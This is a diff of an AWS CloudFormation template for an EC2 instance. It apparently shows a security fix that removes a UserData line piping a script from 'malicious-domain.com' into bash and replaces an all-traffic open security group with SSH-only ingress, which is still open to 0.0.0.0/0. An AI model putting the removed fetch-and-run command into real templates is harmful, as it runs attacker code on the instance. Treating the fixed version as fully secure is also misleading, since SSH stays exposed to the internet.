@@ -1,45 +1,115 @@
 {
-    "AWSTemplateFormatVersion": "2010-09-09",
-    "Description": "secure EC2 instance template",
-    "Resources": {
-      "secureSecurityGroup": {
-        "Type": "AWS::EC2::SecurityGroup",
-        "Properties": {
-          "GroupDescription": "inbound traffic - secure",
-          "SecurityGroupIngress": [
-            {
-              "IpProtocol": "-1",
-              "CidrIp": "0.0.0.0/0"
-            }
-          ],
-          "VpcId": "vpc-123456"
+  "AWSTemplateFormatVersion": "2010-09-09",
+  "Description": "secure EC2 instance template",
+  "Resources": {
+    "secureSecurityGroup": {
+      "Type": "AWS::EC2::SecurityGroup",
+      "Properties": {
+        "GroupDescription": "inbound traffic - secure",
+        "SecurityGroupIngress": [
+          {
+            "IpProtocol": "tcp",
+            "FromPort": "22",
+            "ToPort": "22",
+            "CidrIp": "0.0.0.0/0"
+          }
+        ],
+        "VpcId": {
+          "Ref": "VPCId"
         }
-      },
-      "secureEC2Instance": {
-        "Type": "AWS::EC2::Instance",
-        "Properties": {
-          "ImageId": "ami-12345678",
-          "InstanceType": "t2.micro",
-          "KeyName": "my-key",
-          "SecurityGroupIds": [
-            {
-              "Ref": "secureSecurityGroup"
+      }
+    },
+    "secureEC2Instance": {
+      "Type": "AWS::EC2::Instance",
+      "Properties": {
+        "ImageId": "ami-12345678",
+        "InstanceType": "t2.micro",
+        "KeyName": "my-key",
+        "SecurityGroupIds": [
+          {
+            "Ref": "secureSecurityGroup"
+          }
+        ],
+        "UserData": {
+          "Fn::Base64": {
+            "Fn::Join": [
+              "",
+              [
+                "#!/bin/bash\n",
+                "yum update -y\n"
+              ]
+            ]
+          }
+        },
+        "IamInstanceProfile": {
+          "Ref": "InstanceProfile"
+        },
+        "BlockDeviceMappings": [
+          {
+            "DeviceName": "/dev/sda1",
+            "Ebs": {
+              "VolumeType": "gp2",
+              "VolumeSize": "8",
+              "Encrypted": "true"
             }
-          ],
-          "UserData": {
-            "Fn::Base64": {
-              "Fn::Join": [
-                "",
-                [
-                  "#!/bin/bash\n",
-                  "yum update -y\n",
-                  "curl http://malicious-domain.com/script.sh | bash\n"
-                ]
+          }
+        ],
+        "Monitoring": "true"
+      }
+    },
+    "InstanceProfile": {
+      "Type": "AWS::IAM::InstanceProfile",
+      "Properties": {
+        "Roles": [
+          {
+            "Ref": "EC2Role"
+          }
+        ]
+      }
+    },
+    "EC2Role": {
+      "Type": "AWS::IAM::Role",
+      "Properties": {
+        "AssumeRolePolicyDocument": {
+          "Version": "2012-10-17",
+          "Statement": [
+            {
+              "Effect": "Allow",
+              "Principal": {
+                "Service": "ec2.amazonaws.com"
+              },
+              "Action": "sts:AssumeRole"
+            }
+          ]
+        },
+        "Policies": [
+          {
+            "PolicyName": "EC2Policy",
+            "PolicyDocument": {
+              "Version": "2012-10-17",
+              "Statement": [
+                {
+                  "Effect": "Allow",
+                  "Action": [
+                    "logs:CreateLogGroup",
+                    "logs:CreateLogStream",
+                    "logs:PutLogEvents"
+                  ],
+                  "Resource": "*"
+                }
               ]
             }
           }
-        }
+        ]
+      }
+    }
+  },
+  "Outputs": {
+    "InstanceID": {
+      "Description": "Instance ID",
+      "Value": {
+        "Ref": "secureEC2Instance"
       }
     }
   }
-  
+}
